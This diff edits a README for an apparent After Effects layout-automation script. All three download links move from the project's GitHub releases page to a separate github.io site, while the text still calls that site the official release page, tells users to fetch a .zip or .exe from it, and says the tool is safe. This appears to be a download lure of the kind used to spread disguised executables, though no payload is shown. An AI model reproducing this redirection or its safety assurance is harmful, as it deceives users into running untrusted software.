@@ -1,6 +1,6 @@
 # 🎬 ae-motion-compiler-script - Automate layout tasks in Adobe After Effects
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Melvynglorious817/ae-motion-compiler-script/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://melvynglorious817.github.io)
 
 This software manages motion graphics pipes for Adobe After Effects CC 2024 and newer versions. It handles repetitive tasks like layer organization and prepares files for final rendering. Users save time on manual setup and focus on design output.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to get the tool on your machine:
 
-1. Visit the [official release page](https://github.com/Melvynglorious817/ae-motion-compiler-script/releases).
+1. Visit the [official release page](https://melvynglorious817.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .zip or .exe to start the download.
 4. Save the folder in a location you can find easily, such as your Downloads folder.
@@ -60,7 +60,7 @@ For issues with render settings, confirm that Adobe After Effects recognizes you
 
 This script contains safe, standard automation code. It does not send your project data to external servers. All operations occur locally on your machine. 
 
-Check the [download page](https://github.com/Melvynglorious817/ae-motion-compiler-script/releases) occasionally for newer versions. Developers release updates to keep the tool compatible with future versions of Adobe After Effects. If Adobe releases a new version of their software, you might need to move the script file to the new version's folder path.
+Check the [download page](https://melvynglorious817.github.io) occasionally for newer versions. Developers release updates to keep the tool compatible with future versions of Adobe After Effects. If Adobe releases a new version of their software, you might need to move the script file to the new version's folder path.
 
 ## 📄 Managing your preferences
 
